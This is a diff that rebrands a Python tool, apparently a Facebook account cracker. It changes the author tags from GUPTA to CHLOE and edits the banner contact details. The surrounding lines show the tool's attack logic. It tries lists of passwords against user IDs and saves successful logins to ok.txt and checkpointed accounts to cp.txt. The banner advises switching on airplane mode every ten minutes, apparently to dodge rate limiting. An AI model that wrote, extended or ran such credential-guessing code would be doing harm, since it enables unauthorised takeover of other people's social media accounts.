@@ -79,11 +79,11 @@ logo = """
 \033[1;96m◁━━━━━━━━━━━━━━━━━━━━◈☠️◈━━━━━━━━━━━━━━━━━━━━▷\033[1;97m
 
 
-\033[1;96m(🌟)\033[1;97m Author : GUPTA-SHAKEL \033[1;97m[ \033[0;92mGUPTA \033[1;97m]
+\033[1;96m(🌟)\033[1;97m Tool Author : GUPTA-SHAKEL \033[1;97m[ \033[0;92mGUPTA \033[1;97m]
 
-\033[1;96m(🌟)\033[1;97m Github : http://www.github.com/Chloe-19
+\033[1;96m(🌟)\033[1;97m Github     : http://www.github.com/Chloe-19
 
-\033[1;96m(🌟)\033[1;97m Fb     : +2347085231817
+\033[1;96m(🌟)\033[1;97m Whatsapp  : +2347085231817
                            
             USE AIRPLANE MODE EVERY 10 MINT
 \033[1;97m-----------------------------------------------
@@ -711,7 +711,7 @@ def menu_select():
 
 		                                        if 'access_token' in d:
 
-		                                            print("\x1b[1;96m[GUPTA-OK] "+uid+" | "+pass5+"\x1b[1;0m")
+		                                            print("\x1b[1;96m[CHLOE-OK] "+uid+" | "+pass5+"\x1b[1;0m")
 
 		                                            ok=open("ok.txt","a")
 
@@ -731,7 +731,7 @@ def menu_select():
 
 		                                            if 'www.facebook.com' in d['error_msg']:
 
-		                                                print("\033[1;96m[GUPTA-CP] "+uid+" | "+pass6)
+		                                                print("\033[1;96m[CHLOE-CP] "+uid+" | "+pass6)
 
 		                                                cp=open("cp.txt","a")
 
@@ -745,7 +745,7 @@ def menu_select():
 
 		                                                if 'access_token' in d:
 
-		                                                    print("\x1b[1;96m[GUPTA-OK] "+uid+" | "+pass6+"\x1b[1;0m")
+		                                                    print("\x1b[1;96m[CHLOE-OK] "+uid+" | "+pass6+"\x1b[1;0m")
 
 		                                                    ok=open("ok.txt","a")
 
@@ -765,7 +765,7 @@ def menu_select():
 
 		                                                    if 'www.facebook.com' in d['error_msg']:
 
-		                                                        print("\033[1;96m[GUPTA-CP] "+uid+" | "+pass7)
+		                                                        print("\033[1;96m[CHLOE-CP] "+uid+" | "+pass7)
 
 		                                                        cp=open("cp.txt","a")
 
@@ -779,7 +779,7 @@ def menu_select():
 
 		                                                        if 'access_token' in d:
 
-		                                                            print("\x1b[1;96m[GUPTA-OK] "+uid+" | "+pass7+"\x1b[1;0m")
+		                                                            print("\x1b[1;96m[CHLOE-OK] "+uid+" | "+pass7+"\x1b[1;0m")
 
 		                                                            ok=open("ok.txt","a")
 
